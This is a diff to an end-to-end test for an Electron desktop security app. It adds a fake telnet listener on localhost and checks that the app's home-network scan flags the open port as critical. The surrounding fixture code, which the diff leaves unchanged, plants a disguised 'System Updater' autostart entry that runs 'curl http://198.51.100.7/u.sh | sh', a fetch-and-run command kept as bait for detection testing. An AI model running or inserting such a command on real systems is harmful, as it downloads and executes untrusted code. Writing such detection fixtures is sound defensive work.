@@ -133,6 +133,9 @@ await writeFile(join(home, ".bashrc"), "export PATH=$PATH:$HOME/bin\n");
 await writeFile(join(home, ".config", "autostart", "updater.desktop"), "[Desktop Entry]\nType=Application\nName=System Updater\nExec=sh -c 'curl http://198.51.100.7/u.sh | sh'\n");
 // A program reachable from the network on the VNC port, which the security centre should flag.
 const vnc = createTcpServer().listen(5900, "0.0.0.0");
+// A fake telnet service on the alternate port, so the home-network scan finds an open, risky service.
+const fakeTelnet = createTcpServer((socket) => { socket.write("login: "); socket.on("error", () => {}); }).listen(2323, "127.0.0.1");
+fakeTelnet.on("error", () => {});
 // Browser history with one visit to a listed domain and one to a listed exact URL.
 const chromeProfile = join(home, ".config", "google-chrome", "Default");
 await mkdir(chromeProfile, { recursive: true });
@@ -177,7 +180,7 @@ await mkdir(join(home, ".local", "bin"), { recursive: true });
 const app = await electron.launch({
   executablePath: require("electron"),
   args: [join(root, "dist", "main.js"), "--no-sandbox"],
-  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files, QALAA_EXPORT_DIR: exports, QALAA_TEST_REMOVABLE_ROOT: drives, XDG_CONFIG_HOME: join(home, ".config"), XDG_CACHE_HOME: join(home, ".cache"), XDG_DATA_HOME: join(home, ".local", "share") },
+  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files, QALAA_EXPORT_DIR: exports, QALAA_TEST_REMOVABLE_ROOT: drives, QALAA_TEST_NETWORK_HOST: "127.0.0.1", XDG_CONFIG_HOME: join(home, ".config"), XDG_CACHE_HOME: join(home, ".cache"), XDG_DATA_HOME: join(home, ".local", "share") },
 });
 app.process().stderr?.on("data", (chunk) => { if (process.env.E2E_DEBUG) process.stderr.write(`[app] ${chunk}`); });
 const page = await app.firstWindow();
@@ -637,6 +640,17 @@ assert.match(await page.locator("#blocked-programs").innerText(), /not available
 await shot(page, "desktop-tools");
 step("file shredder: a chosen file destroyed, the home folder refused; firewall blocking explained on Linux");
 
+// Home network scan: finds the fake device, its open telnet port, and reports it.
+await page.click('[data-tab="network"]');
+await page.waitForSelector("#network-scan");
+await page.click("#network-scan");
+await page.waitForSelector("#network-findings", { timeout: 30000 });
+await page.waitForFunction(() => /telnet/i.test(document.querySelector("#network-findings")?.textContent ?? ""), null, { timeout: 30000 });
+assert.match(await page.locator("#network-devices").innerText(), /127\.0\.0\.1/, "the scanned device is listed");
+assert.match(await page.locator("#network-findings").innerText(), /Critical/, "the open telnet port is a critical finding");
+await shot(page, "desktop-network");
+step("home network: a scan finds the device, flags its open telnet port as critical, lists it by address");
+
 await page.click('[data-tab="settings"]');
 await page.selectOption("#language", "ar");
 await page.waitForSelector("text=الحماية");
@@ -649,4 +663,5 @@ await app.close();
 sleeper.kill();
 server.close();
 vnc.close();
+fakeTelnet.close();
 console.log("All desktop checks passed.");
